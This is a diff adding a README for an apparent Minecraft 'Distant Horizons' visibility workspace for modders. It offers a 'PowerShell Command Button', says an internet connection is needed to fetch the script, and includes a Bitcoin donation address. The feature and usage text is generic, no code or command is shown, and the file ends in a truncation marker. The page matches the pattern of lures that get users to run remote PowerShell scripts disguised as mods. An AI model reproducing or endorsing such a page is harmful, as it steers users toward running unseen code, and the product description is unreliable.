@@ -1,0 +1,93 @@
+Distant Horizons Minecraft Visibility Workspace for modding 🧭
+
+⌨️ PowerShell Command Button
+
+Show your support
+
+BTC:&nbsp;1GeSS7YG6hhQxCGtxK16GQ2wj7vnzthUNW
+
+The horizon isn't a wall—it's an invitation, and Distant Horizons Minecraft Visibility Workspace exists to answer it. Built for modders who refuse to let render distance dictate the shape of their worlds, this workspace gathers the tools, configs, and structural groundwork needed to push Minecraft's visibility systems further than vanilla ever intended. Whether you're extending terrain LODs, tuning chunk streaming, or rebuilding how the engine decides what's worth showing, you'll find a foundation here that respects your time and your tinkering. Dive in, break things, and stretch the world until the fog gives up.
+
+📋 System Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+How It Works
+
+Under the hood, the Distant Horizons Minecraft Visibility Workspace acts as a bridge between your client and the sprawling terrain data that Distant Horizons already generates. Instead of letting vanilla chunk limits dictate what you can see, the workspace takes the level-of-detail (LOD) data produced by Distant Horizons and feeds it through a lightweight visibility pipeline — so distant mountains, far-off forests, and horizon-spanning build projects render as real geometry rather than fog or empty sky.
+
+The workspace keeps its footprint lean by leaning on the LOD system rather than forcing full-resolution chunks into memory. It schedules rendering passes based on what your camera can actually perceive, prioritizes nearby detail, and gracefully fades distant geometry so the transition between vanilla chunks and LOD terrain feels seamless. Config profiles let you tune draw distance, quality tiers, and performance ceilings without touching a single line of code — or dive into the exposed hooks if you want to wire in your own logic.
+
+Everything is organized as a modder-friendly workspace: clear entry points, documented config surfaces, and modular components you can swap, extend, or strip out. Whether you're patching it into an existing pack or building on top of it for your own visibility experiments, the internals stay readable and hackable. Point it at your world, load in, and watch the horizon stop being a wall.
+
+Modules and Settings
+
+Distance Detail Tuning
+Controls the level-of-detail transitions that determine when distant terrain swaps between simplified and detailed geometry.
+- Adjust transition distances so nearby terrain keeps full detail while far terrain stays lightweight.
+- Tune the amount of simplification applied at each range band to smooth the shift in terrain appearance.
+- Preview how geometry changes look while moving through the world to avoid abrupt swaps on the horizon.
+
+Render Distance Presets
+Bundles distance, quality and culling choices into named profiles that can be selected for different play situations.
+- Create presets for exploration, building or lower-end hardware and switch between them in a single step.
+- Edit an existing preset without re-tuning individual settings each session.
+- Apply a preset consistently so the configured view range stays stable across play sessions.
+
+Visual Quality and Horizon Blending
+Groups the visual fidelity controls for distant chunks together with the atmospheric blending that integrates far terrain into the environment.
+- Tune texture detail, shading and feature simplification at range without degrading nearby scenery.
+- Adjust how far terrain fades into fog, sky color and horizon haze so land does not end at a visible cutoff.
+- Lower long-range quality while keeping the horizon transition natural, balancing visible range against retained detail.
+
+World Profiles and Compatibility Review
+Assigns visibility configurations per world and reviews how active settings interact with other installed mods and resource packs.
+- Attach independent profiles to creative builds, survival worlds or shared multiplayer environments, applied automatically on load.
+- Inspect detected overlaps with other rendering behaviors and toggle potentially conflicting options before applying changes.
+- See which settings are active and which conflicts were flagged so configuration choices stay deliberate.
+
+Performance Budget and Profile Sharing
+Caps the resource cost of distant rendering and moves tuned configurations between installations.
+- Set limits on how much terrain is processed per update to match hardware without disabling distant terrain.
+- Export visibility configurations as portable profiles that preserve individual tuning values.
+- Import a profile to restore the same visibility behavior on another machine or for another player.
+
+These modules work as one workspace: presets select the overall distance and quality posture, detail tuning and blending refine how that posture looks at the horizon, world profiles decide where it applies, and budget limits keep the result sustainable; compatibility review and profile sharing close the loop by making the setup deliberate and portable.
+
+Additional Settings
+- Transition smoothing: softens how quickly geometry detail changes as terrain distance shifts.
+- Fog density scaling: adjusts the thickness of atmospheric fade applied to far terrain.
+- Culling aggressiveness: controls how eagerly distant features are dropped from rendering work.
+- Conflict warning level: sets how prominently detected overlaps with other mods are surfaced in the review area.
+- Profile lock: prevents accidental edits to a world profile once it has been tuned and applied.
+
+Usage Scenarios
+
+Setting Up an Exploration Preset Without Losing Nearby Detail
+Goal: A player wants to see farther across open terrain during exploration while keeping nearby terrain crisp and avoiding sudden geometry swaps on the horizon.
+Steps:
+1. Open Render Distance Presets and create a named preset for exploration.
+2. In Distance Detail Tuning, push the transition distances outward so nearby terrain keeps full detail and only far terrain simplifies.
+3. In Visual Quality and Horizon Blending, lower texture detail and shading at long range while leaving nearby scenery untouched, and soften the fog and horizon haze so far land does not end at a visible cutoff.
+4. Enable transition smoothing in Additional Settings to soften how quickly geometry detail changes as terrain distance shifts.
+5. Apply the preset so the configured view range stays stable across play sessions.
+
+Expected result: The player moves through the world with a gradual, blended horizon, simplified distant geometry instead of abrupt swaps, and nearby terrain that remains detailed.
+
+Tuning a Low-End Hardware Profile for a Shared Multiplayer World
+Goal: A player on modest hardware wants distant terrain enabled on a shared multiplayer world without overloading the game.
+Steps:
+1. In World Profiles, attach a profile to the multiplayer save so it applies automatically on load.
+2. In Performance Budget and Profile Sharing, set limits on how much terrain is processed per update to match the hardware while keeping distant terrain enabled.
+3. In Visual Quality and Horizon Blending, reduce long-range quality and adjust culling aggressiveness so distant features are dropped more eagerly from rendering work.
+4. Use Compatibility and Conflict Review to inspect detected overlaps with other installed rendering mods and toggle potentially conflicting options before applying changes.
+5. Turn on Profile lock in Additional Settings so the tuned multiplayer profile is not edited by accident.
+
+Expected result: The world loads with its dedicated profile applied each time, distant terrain stays visible under a predictable performance cap, and the review area shows which settings are active and which overlaps were flagged.
+
+Sharing a Tuned Configuration With Another Player
+
+…（内容已截断）
